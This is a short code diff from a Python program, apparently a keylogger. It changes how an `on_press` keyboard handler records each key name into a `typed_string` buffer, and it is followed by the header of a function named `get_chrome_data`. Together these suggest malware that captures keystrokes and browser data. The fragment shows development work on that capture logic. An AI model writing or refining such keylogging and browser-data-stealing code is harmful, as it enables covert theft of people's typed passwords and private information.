@@ -47,15 +47,9 @@ def on_press(event):
         #    name = f"[Code {event.code}]"
         else:
             name = f"[{event.name.title()}]"
-    #elif event.name == "alt gr":
-    #    event.name = "[Alt Gr]"
-    #elif event.name == "alt":
-    #    pass
-    #elif event.name == "ctrl":
-    #    event.name = "[Ctrl]"
-    #elif event.name == "right shift":
-    #    event.name = "[Shift]"
-    typed_string += f"{event.name}"
+    else:
+        name = event.name
+        typed_string += f"{name}"
 
 
 def get_chrome_data():
